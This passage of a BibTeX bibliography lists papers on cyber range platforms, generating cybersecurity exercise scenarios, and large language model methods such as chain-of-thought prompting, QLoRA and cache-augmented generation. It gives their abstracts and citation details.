	url = {https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10495954/},
	doi = {10.7717/peerj-cs.1574},
	abstract = {Cyberattacks, particularly those targeting systems that store or handle sensitive data, have become more sophisticated in recent years. To face increasing threats, continuous capacity building and digital skill competence are needed. Cybersecurity hands-on training is essential to upskill cybersecurity professionals. However, the cost of developing and maintaining a cyber range platform is high. Setting up an ideal digital environment for cybersecurity exercises can be challenging and often need to invest a lot of time and system resources in this process. In this article, we present a lightweight cyber range platform that was developed under the open-source cloud platform {OpenStack}, based on Docker technology using {IaC} methodology. Combining the advantages of Docker technology, {DevOps} automation capabilities, and the cloud platform, the proposed cyber range platform achieves the maximization of performance and scalability while reducing costs and resources.},
	pages = {e1574},
	journaltitle = {{PeerJ} Computer Science},
	shortjournal = {{PeerJ} Comput Sci},
	author = {Chouliaras, Nestoras and Kantzavelou, Ioanna and Maglaras, Leandros and Pantziou, Grammati and Amine Ferrag, Mohamed},
	urldate = {2024-12-07},
	date = {2023-09-07},
	pmid = {37705644},
	pmcid = {PMC10495954},
}

@online{noauthor_pedagogy_nodate,
	title = {Pedagogy - Diversifying Your Teaching Methods, Learning Activities, and Assignments {\textbar} Center for Educational Innovation},
	url = {https://cei.umn.edu/teaching-resources/inclusive-teaching-predominantly-white-institution/pedagogy-diversifying-your-teaching-methods-learning-activities-and-assignments},
	urldate = {2024-12-01},
}

@article{zacharis_aicef_2023,
	title = {{AiCEF}: an {AI}-assisted cyber exercise content generation framework using named entity recognition},
	volume = {22},
	issn = {1615-5270},
	url = {https://doi.org/10.1007/s10207-023-00693-z},
	doi = {10.1007/s10207-023-00693-z},
	shorttitle = {{AiCEF}},
	abstract = {Content generation that is both relevant and up to date with the current threats of the target audience is a critical element in the success of any cyber security exercise ({CSE}). Through this work, we explore the results of applying machine learning techniques to unstructured information sources to generate structured {CSE} content. The corpus of our work is a large dataset of publicly available cyber security articles that have been used to predict future threats and to form the skeleton for new exercise scenarios. Machine learning techniques, like named entity recognition and topic extraction, have been utilised to structure the information based on a novel ontology we developed, named Cyber Exercise Scenario Ontology ({CESO}). Moreover, we used clustering with outliers to classify the generated extracted data into objects of our ontology. Graph comparison methodologies were used to match generated scenario fragments to known threat actors’ tactics and help enrich the proposed scenario accordingly with the help of synthetic text generators. {CESO} has also been chosen as the prominent way to express both fragments and the final proposed scenario content by our {AI}-assisted Cyber Exercise Framework. Our methodology was assessed by providing a set of generated scenarios for evaluation to a group of experts to be used as part of a real-world awareness tabletop exercise.},
	pages = {1333--1354},
	number = {5},
	journaltitle = {International Journal of Information Security},
	shortjournal = {Int. J. Inf. Secur.},
	author = {Zacharis, Alexandros and Patsakis, Constantinos},
	urldate = {2024-12-01},
	date = {2023-10-01},
	langid = {english},
	keywords = {Artificial Intelligence, Artificial intelligence, Cyber security exercise ontology, Cyber security exercise scenario},
}

@inproceedings{nakata_cyexec_2021,
	location = {Online Streaming, --- Select a Country ---},
	title = {{CyExec}*: Automatic Generation of Randomized Cyber Range Scenarios:},
	isbn = {978-989-758-491-6},
	url = {https://www.scitepress.org/DigitalLibrary/Link.aspx?doi=10.5220/0010324502260236},
	doi = {10.5220/0010324502260236},
	shorttitle = {{CyExec}*},
	abstract = {With the development of information technology, the need for information security education is increasing, and the effectiveness of cyber range exercises is attracting attention. The cyber range is a system to learn knowledge and skills by experiencing an incident scenario reproduced in a virtual environment. Many scenarios are required to train a security expert through various incident experiences. However, scenario development requires highly specialized expertise. Thus, in practice, only a limited number of scenarios are worn out around. Identical scenarios may decrease the educational effect since the other teams’ actions or write-ups on the internet will hint the students. We propose {CyExec}*, a cyber range system that automatically generates multiple scenarios based on {DAG}(Directed Acyclic Graph)-based scenario randomization. Multiple scenarios with the same learning objectives can enhance teaching effectiveness and prevent cheating. We developed the {DAGbased} scenario randomization technique on a Docker-based cyber range system called {CyExec}. By taking full advantage of Docker’s system/network configuration power, we can randomize complex scenarios across multiple networks. Comparison with the {VM}-based scenario generators, {CyExec}* outperforms, especially in storage usage. Further, {CyExec}∗ only consumes 1/3 memories, 1/4 {CPU} loads, and 1/10 storage usages. Thus, Cyexec∗ can operate approximately 3-times more complex scenarios than {VM}-based systems.},
	eventtitle = {7th International Conference on Information Systems Security and Privacy},
	pages = {226--236},
	booktitle = {Proceedings of the 7th International Conference on Information Systems Security and Privacy},
	publisher = {{SCITEPRESS} - Science and Technology Publications},
	author = {Nakata, Ryotaro and Otsuka, Akira},
	urldate = {2024-12-01},
	date = {2021},
}

@article{yamin_serious_2021,
	title = {Serious games as a tool to model attack and defense scenarios for cyber-security exercises},
	volume = {110},
	issn = {0167-4048},
	url = {https://www.sciencedirect.com/science/article/pii/S0167404821002741},
	doi = {10.1016/j.cose.2021.102450},
	abstract = {Technology is evolving rapidly; this poses a problem for security specialists and average citizens as their technological skill sets are quickly made obsolete. This makes the knowledge and understanding of cyber-security in a technologically evolving world difficult. Global {IT} infrastructure and individuals’ privacy are constantly under threat. One way to tackle this problem is by providing continuous training and self-learning platforms. Cyber-security exercises can provide a necessary platform for training people’s cyber-security skills. However, conducting cyber-security exercises with new and unique scenarios requires comprehensive planning and commitment to the preparation time and resources. In this work, we propose a serious game for the development of cyber-security exercise scenarios. The game provides a platform to model simulated cyber-security exercise scenarios, transforming them into an emulated cyber-security exercise environment using domain-specific language ({DSL}) and infrastructure orchestration. In this game, players can play as cyber attackers or defenders in a multiplayer environment to make operational cyber-security decisions in real-time. The decisions are evaluated for the development of operational cyber-attack and defense strategies.},
	pages = {102450},
	journaltitle = {Computers \& Security},
	shortjournal = {Computers \& Security},
	author = {Yamin, Muhammad Mudassar and Katt, Basel and Nowostawski, Mariusz},
	urldate = {2024-12-01},
	date = {2021-11-01},
	keywords = {Attack, Cyber range, Cyber-security, Defense, Exercises, Scenarios},
}

@online{noauthor_applications_nodate,
	title = {Applications of {LLMs} for Generating Cyber Security Exercise Scenarios {\textbar} {IEEE} Journals \& Magazine {\textbar} {IEEE} Xplore},
	url = {https://ieeexplore.ieee.org/document/10695083},
	urldate = {2024-12-01},
}

@misc{wei_chain--thought_2023,
	title = {Chain-of-Thought Prompting Elicits Reasoning in Large Language Models},
	url = {http://arxiv.org/abs/2201.11903},
	doi = {10.48550/arXiv.2201.11903},
	abstract = {We explore how generating a chain of thought -- a series of intermediate reasoning steps -- significantly improves the ability of large language models to perform complex reasoning. In particular, we show how such reasoning abilities emerge naturally in sufficiently large language models via a simple method called chain of thought prompting, where a few chain of thought demonstrations are provided as exemplars in prompting. Experiments on three large language models show that chain of thought prompting improves performance on a range of arithmetic, commonsense, and symbolic reasoning tasks. The empirical gains can be striking. For instance, prompting a 540B-parameter language model with just eight chain of thought exemplars achieves state of the art accuracy on the {GSM}8K benchmark of math word problems, surpassing even finetuned {GPT}-3 with a verifier.},
	number = {{arXiv}:2201.11903},
	publisher = {{arXiv}},
	author = {Wei, Jason and Wang, Xuezhi and Schuurmans, Dale and Bosma, Maarten and Ichter, Brian and Xia, Fei and Chi, Ed and Le, Quoc and Zhou, Denny},
	urldate = {2024-11-26},
	date = {2023-01-10},
	eprinttype = {arxiv},
	eprint = {2201.11903},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@online{noauthor_zotero_nodate,
	title = {Zotero {\textbar} Your personal research assistant},
	url = {https://www.zotero.org/mission-deny-the-mission/library},
	urldate = {2024-11-26},
}

@article{schreuders_open_nodate,
	title = {An open cloud-based virtual lab environment for computer security education},
	abstract = {Providing an environment that enables students to gain hands-on experience with security tools in rich and complex learning scenarios, while granting them the freedom to experiment with potentially harmful tools, is an issue for many universities and organisations. As is the challenge of enabling students the flexibility to work from home. This paper presents the results of a pilot study of our proposed solution based on {oVirt}. Opportunities for improvements are identified, and it is concluded that {oVirt} is a feasible platform on which to build a lab environment for teaching computer security.},
	author = {Schreuders, Z Cliffe and Butterfield, Emlyn and Staniforth, Paul},
	langid = {english},
}

@article{schreuders_generating_nodate,
	title = {Generating randomised virtualised scenarios for ethical hacking and computer security education},
	abstract = {Computer security students benefit from having hands-on experience with hacking tools and with access to vulnerable systems that they can attack and defend. However, vulnerable {VMs} are static; once they have been exploited by a student there is no repeatable challenge as the vulnerable boxes never change. A new novel solution, {SecGen}, has been created and deployed. {SecGen} solves the issue by creating vulnerable machines with randomised vulnerabilities and services, with constraints that ensure each scenario is catered to specific skills or concepts. {SecGen} was successfully deployed to generate {VMs} for a second year undergraduate team module. Future plans are discussed.},
	author = {Schreuders, Z Cliffe and Ardern, Lewis},
	langid = {english},
}

@online{noauthor_httpsarxivorgpdf210609685_nodate,
	title = {https://arxiv.org/pdf/2106.09685},
	url = {https://arxiv.org/pdf/2106.09685},
	urldate = {2024-11-05},
}

@misc{dettmers_qlora_2023,
	title = {{QLoRA}: Efficient Finetuning of Quantized {LLMs}},
	url = {http://arxiv.org/abs/2305.14314},
	shorttitle = {{QLoRA}},
	abstract = {We present {QLoRA}, an efficient finetuning approach that reduces memory usage enough to finetune a 65B parameter model on a single 48GB {GPU} while preserving full 16-bit finetuning task performance. {QLoRA} backpropagates gradients through a frozen, 4-bit quantized pretrained language model into Low Rank Adapters{\textasciitilde}({LoRA}). Our best model family, which we name Guanaco, outperforms all previous openly released models on the Vicuna benchmark, reaching 99.3\% of the performance level of {ChatGPT} while only requiring 24 hours of finetuning on a single {GPU}. {QLoRA} introduces a number of innovations to save memory without sacrificing performance: (a) 4-bit {NormalFloat} ({NF}4), a new data type that is information theoretically optimal for normally distributed weights (b) double quantization to reduce the average memory footprint by quantizing the quantization constants, and (c) paged optimziers to manage memory spikes. We use {QLoRA} to finetune more than 1,000 models, providing a detailed analysis of instruction following and chatbot performance across 8 instruction datasets, multiple model types ({LLaMA}, T5), and model scales that would be infeasible to run with regular finetuning (e.g. 33B and 65B parameter models). Our results show that {QLoRA} finetuning on a small high-quality dataset leads to state-of-the-art results, even when using smaller models than the previous {SoTA}. We provide a detailed analysis of chatbot performance based on both human and {GPT}-4 evaluations showing that {GPT}-4 evaluations are a cheap and reasonable alternative to human evaluation. Furthermore, we find that current chatbot benchmarks are not trustworthy to accurately evaluate the performance levels of chatbots. A lemon-picked analysis demonstrates where Guanaco fails compared to {ChatGPT}. We release all of our models and code, including {CUDA} kernels for 4-bit training.},
	number = {{arXiv}:2305.14314},
	publisher = {{arXiv}},
	author = {Dettmers, Tim and Pagnoni, Artidoro and Holtzman, Ari and Zettlemoyer, Luke},
	urldate = {2024-11-03},
	date = {2023-05-23},
	langid = {english},
	eprinttype = {arxiv},
	eprint = {2305.14314 [cs]},
	keywords = {Computer Science - Machine Learning},
}

@misc{gan_large_2023,
	title = {Large Language Models in Education: Vision and Opportunities},
	url = {http://arxiv.org/abs/2311.13160},
	shorttitle = {Large Language Models in Education},
	abstract = {With the rapid development of artificial intelligence technology, large language models ({LLMs}) have become a hot research topic. Education plays an important role in human social development and progress. Traditional education faces challenges such as individual student differences, insufficient allocation of teaching resources, and assessment of teaching effectiveness. Therefore, the applications of {LLMs} in the field of digital/smart education have broad prospects. The research on educational large models ({EduLLMs}) is constantly evolving, providing new methods and approaches to achieve personalized learning, intelligent tutoring, and educational assessment goals, thereby improving the quality of education and the learning experience. This article aims to investigate and summarize the application of {LLMs} in smart education. It first introduces the research background and motivation of {LLMs} and explains the essence of {LLMs}. It then discusses the relationship between digital education and {EduLLMs} and summarizes the current research status of educational large models. The main contributions are the systematic summary and vision of the research background, motivation, and application of large models for education ({LLM}4Edu). By reviewing existing research, this article provides guidance and insights for educators, researchers, and policy-makers to gain a deep understanding of the potential and challenges of {LLM}4Edu. It further provides guidance for further advancing the development and application of {LLM}4Edu, while still facing technical, ethical, and practical challenges requiring further research and exploration.},
	number = {{arXiv}:2311.13160},
	publisher = {{arXiv}},
	author = {Gan, Wensheng and Qi, Zhenlian and Wu, Jiayang and Lin, Jerry Chun-Wei},
	urldate = {2024-11-03},
	date = {2023-11-22},
	langid = {english},
	eprinttype = {arxiv},
	eprint = {2311.13160 [cs]},
	keywords = {Computer Science - Artificial Intelligence},
}

@misc{vaswani_attention_2023,
	title = {Attention Is All You Need},
	url = {http://arxiv.org/abs/1706.03762},
	doi = {10.48550/arXiv.1706.03762},
	abstract = {The dominant sequence transduction models are based on complex recurrent or convolutional neural networks in an encoder-decoder configuration. The best performing models also connect the encoder and decoder through an attention mechanism. We propose a new simple network architecture, the Transformer, based solely on attention mechanisms, dispensing with recurrence and convolutions entirely. Experiments on two machine translation tasks show these models to be superior in quality while being more parallelizable and requiring significantly less time to train. Our model achieves 28.4 {BLEU} on the {WMT} 2014 English-to-German translation task, improving over the existing best results, including ensembles by over 2 {BLEU}. On the {WMT} 2014 English-to-French translation task, our model establishes a new single-model state-of-the-art {BLEU} score of 41.8 after training for 3.5 days on eight {GPUs}, a small fraction of the training costs of the best models from the literature. We show that the Transformer generalizes well to other tasks by applying it successfully to English constituency parsing both with large and limited training data.},
	number = {{arXiv}:1706.03762},
	publisher = {{arXiv}},
	author = {Vaswani, Ashish and Shazeer, Noam and Parmar, Niki and Uszkoreit, Jakob and Jones, Llion and Gomez, Aidan N. and Kaiser, Lukasz and Polosukhin, Illia},
	urldate = {2024-10-19},
	date = {2023-08-02},
	eprinttype = {arxiv},
	eprint = {1706.03762},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@online{noauthor_constructivism_nodate,
	title = {Constructivism},
	url = {https://www.buffalo.edu/catt/teach/develop/theory/constructivism.html},
	abstract = {Creating experiences that facilitate the construction of knowledge.},
	urldate = {2024-10-17},
	langid = {english},
}
@misc{serena_simulation_2025,
    title = {Simulation in {Cybersecurity}: {Understanding} {Techniques}, {Applications}, and {Goals}},
    shorttitle = {Simulation in {Cybersecurity}},
    url = {http://arxiv.org/abs/2508.06106},
    doi = {10.48550/arXiv.2508.06106},
    abstract = {Modeling and simulation are widely used in cybersecurity research to assess cyber threats, evaluate defense mechanisms, and analyze vulnerabilities. However, the diversity of application areas, the variety of cyberattacks scenarios, and the differing objectives of these simulations makes it difficult to identify methodological trends. Existing reviews often focus on specific modeling techniques or application domains, making it challenging to analyze the field as a whole. To address these limitations, we present a comprehensive review of the current state of the art, classifying the selected papers based on four dimensions: the application domain, the types of cyber threats represented, the simulation techniques employed, and the primary goals of the simulation. The review discusses the strengths and limitations of different approaches, identifies which cyber threats are the most suited for simulation-based investigations, and analyzes which modeling paradigms are most appropriate for specific cybersecurity challenges.},
    urldate = {2025-09-02},
    publisher = {arXiv},
    author = {Serena, Luca and D'Angelo, Gabriele and Ferretti, Stefano and Marzolla, Moreno},
    month = aug,
    year = {2025},
    note = {arXiv:2508.06106 [cs]
version: 1},
    keywords = {Computer Science - Cryptography and Security},
}
@article{sordo_synthetic_2025,
    title = {Synthetic {Scientific} {Image} {Generation} with {VAE}, {GAN}, and {Diffusion} {Model} {Architectures}},
    volume = {11},
    issn = {2313-433X},
    url = {https://www.ncbi.nlm.nih.gov/pmc/articles/PMC12387873/},
    doi = {10.3390/jimaging11080252},
    abstract = {Generative AI (genAI) has emerged as a powerful tool for synthesizing diverse and complex image data, offering new possibilities for scientific imaging applications. This review presents a comprehensive comparative analysis of leading generative architectures, ranging from Variational Autoencoders (VAEs) to Generative Adversarial Networks (GANs) on through to Diffusion Models, in the context of scientific image synthesis. We examine each model’s foundational principles, recent architectural advancements, and practical trade-offs. Our evaluation, conducted on domain-specific datasets including microCT scans of rocks and composite fibers, as well as high-resolution images of plant roots, integrates both quantitative metrics (SSIM, LPIPS, FID, CLIPScore) and expert-driven qualitative assessments. Results show that GANs, particularly StyleGAN, produce images with high perceptual quality and structural coherence. Diffusion-based models for inpainting and image variation, such as DALL-E 2, delivered high realism and semantic alignment but generally struggled in balancing visual fidelity with scientific accuracy. Importantly, our findings reveal limitations of standard quantitative metrics in capturing scientific relevance, underscoring the need for domain-expert validation. We conclude by discussing key challenges such as model interpretability, computational cost, and verification protocols, and discuss future directions where generative AI can drive innovation in data augmentation, simulation, and hypothesis generation in scientific research.},
    number = {8},
    urldate = {2025-09-03},
    journal = {Journal of Imaging},
    author = {Sordo, Zineb and Chagnon, Eric and Hu, Zixi and Donatelli, Jeffrey J. and Andeer, Peter and Nico, Peter S. and Northen, Trent and Ushizima, Daniela},
    month = jul,
    year = {2025},
    pmid = {40863462},
    pmcid = {PMC12387873},
    pages = {252},
}
@misc{noauthor_introducing_nodate,
    title = {Introducing {LFM2}: {The} {Fastest} {On}-{Device} {Foundation} {Models} on the {Market} {\textbar} {Liquid} {AI}},
    shorttitle = {Introducing {LFM2}},
    url = {https://www.liquid.ai/blog/liquid-foundation-models-v2-our-second-series-of-generative-ai-models},
    abstract = {Today, we release LFM2, a new class of Liquid Foundation Models (LFMs) that sets a new standard in quality, speed, and memory efficiency for on-device deployment. Built on a hybrid architecture, LFM2 delivers 200\% faster decode and prefill performance than Qwen3 and Gemma 3 on CPU. It also significantly outperforms models in each size class on instruction-following and function calling—the core capabilities that make LLMs reliable for building AI agents.},
    language = {en},
    urldate = {2025-09-02},
}
@article{orvieto_resurrecting_2023,
    title = {Resurrecting {Recurrent} {Neural} {Networks} for {Long} {Sequences}},
    url = {https://openreview.net/forum?id=M3Yd3QyRG4},
    abstract = {Recurrent Neural Networks (RNNs) offer fast inference on long sequences but are hard to optimize and slow to train. Deep state-space models (SSMs) have recently been shown to perform remarkably well on long sequence modeling tasks, and have the added benefits of fast parallelizable training and RNN-like fast inference. However, while SSMs are superficially similar to RNNs, there are important differences that make it unclear where their performance boost over RNNs comes from. We show that careful design of deep RNNs using standard signal propagation arguments can recover the impressive performance of deep SSMs on long-range reasoning tasks, while matching their training speed. To achieve this, we analyze and ablate a series of changes to standard RNNs including linearizing and diagonalizing the recurrence, using better parameterizations and initializations, and ensuring careful normalization of the forward pass. Our results provide new insights on the origins of the impressive performance of deep SSMs, and introduce an RNN block called the Linear Recurrent Unit (or LRU) that matches both their performance on the Long Range Arena benchmark and their computational efficiency.},
    language = {en},
    urldate = {2025-09-05},
    author = {Orvieto, Antonio and Smith, Samuel L. and Gu, Albert and Fernando, Anushan and Gulcehre, Caglar and Pascanu, Razvan and De, Soham},
    month = jun,
    year = {2023},
}
@article{sapkota_ai_2026,
    title = {{AI} {Agents} vs. {Agentic} {AI}: {A} {Conceptual} {Taxonomy}, {Applications} and {Challenges}},
    volume = {126},
    issn = {15662535},
    shorttitle = {{AI} {Agents} vs. {Agentic} {AI}},
    url = {http://arxiv.org/abs/2505.10468},
    doi = {10.1016/j.inffus.2025.103599},
    abstract = {This study critically distinguishes between AI Agents and Agentic AI, offering a structured conceptual taxonomy, application mapping, and challenge analysis to clarify their divergent design philosophies and capabilities. We begin by outlining the search strategy and foundational definitions, characterizing AI Agents as modular systems driven by Large Language Models (LLMs) and Large Image Models (LIMs) for narrow, task-specific automation. Generative AI is positioned as a precursor, with AI Agents advancing through tool integration, prompt engineering, and reasoning enhancements. In contrast, Agentic AI systems represent a paradigmatic shift marked by multi-agent collaboration, dynamic task decomposition, persistent memory, and orchestrated autonomy. Through a sequential evaluation of architectural evolution, operational mechanisms, interaction styles, and autonomy levels, we present a comparative analysis across both paradigms. Application domains such as customer support, scheduling, and data summarization are contrasted with Agentic AI deployments in research automation, robotic coordination, and medical decision support. We further examine unique challenges in each paradigm including hallucination, brittleness, emergent behavior, and coordination failure and propose targeted solutions such as ReAct loops, RAG, orchestration layers, and causal modeling. This work aims to provide a definitive roadmap for developing robust, scalable, and explainable AI agent and Agentic AI-driven systems. {\textgreater}AI Agents, Agent-driven, Vision-Language-Models, Agentic AI Decision Support System, Agentic-AI Applications},
    urldate = {2025-09-07},
    journal = {Information Fusion},
    author = {Sapkota, Ranjan and Roumeliotis, Konstantinos I. and Karkee, Manoj},
    month = feb,
    year = {2026},
    note = {arXiv:2505.10468 [cs]},
    keywords = {Computer Science - Artificial Intelligence},
    pages = {103599},
}
@inproceedings{chan_dont_2025,
    title = {Don't {Do} {RAG}: {When} {Cache}-{Augmented} {Generation} is {All} {You} {Need} for {Knowledge} {Tasks}},
    shorttitle = {Don't {Do} {RAG}},
    url = {http://arxiv.org/abs/2412.15605},
    doi = {10.1145/3701716.3715490},
    abstract = {Retrieval-augmented generation (RAG) has gained traction as a powerful approach for enhancing language models by integrating external knowledge sources. However, RAG introduces challenges such as retrieval latency, potential errors in document selection, and increased system complexity. With the advent of large language models (LLMs) featuring significantly extended context windows, this paper proposes an alternative paradigm, cache-augmented generation (CAG) that bypasses real-time retrieval. Our method involves preloading all relevant resources, especially when the documents or knowledge for retrieval are of a limited and manageable size, into the LLM's extended context and caching its runtime parameters. During inference, the model utilizes these preloaded parameters to answer queries without additional retrieval steps. Comparative analyses reveal that CAG eliminates retrieval latency and minimizes retrieval errors while maintaining context relevance. Performance evaluations across multiple benchmarks highlight scenarios where long-context LLMs either outperform or complement traditional RAG pipelines. These findings suggest that, for certain applications, particularly those with a constrained knowledge base, CAG provide a streamlined and efficient alternative to RAG, achieving comparable or superior results with reduced complexity.},
    urldate = {2025-09-08},
    booktitle = {Companion {Proceedings} of the {ACM} on {Web} {Conference} 2025},
    author = {Chan, Brian J. and Chen, Chao-Ting and Cheng, Jui-Hung and Huang, Hen-Hsen},
    month = may,
    year = {2025},
    note = {arXiv:2412.15605 [cs]},
    keywords = {Computer Science - Computation and Language},
    pages = {893--897},
}